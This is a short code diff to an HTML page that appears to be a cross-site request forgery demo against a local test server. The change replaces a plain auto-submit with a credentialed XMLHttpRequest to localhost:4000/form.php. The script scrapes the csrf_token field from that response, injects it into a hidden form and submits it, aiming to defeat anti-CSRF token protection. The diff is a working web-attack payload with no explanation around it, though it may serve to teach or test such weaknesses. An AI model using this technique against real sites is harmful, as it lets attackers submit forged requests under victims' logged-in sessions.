@@ -3,7 +3,23 @@
     <input name="receiver" value="bob@mail.com"/>
 </form>
 <script>
-    var form = document.getElementById('form');
+    var req = new XMLHttpRequest();
 
-    form.submit();
+    req.open('GET', 'http://localhost:4000/form.php');
+    req.withCredentials = true;
+    req.addEventListener('readystatechange', e => {
+        if (req.readyState !== req.DONE) {
+            return;
+        }
+        var div = document.createElement('div');
+        div.innerHTML = req.responseText;
+        var input = div.querySelector('input[name="csrf_token"]');
+        if (input == null) {
+            return;
+        }
+        var form = document.getElementById('form');
+        form.appendChild(input);
+        form.submit();
+    });
+    req.send();
 </script>
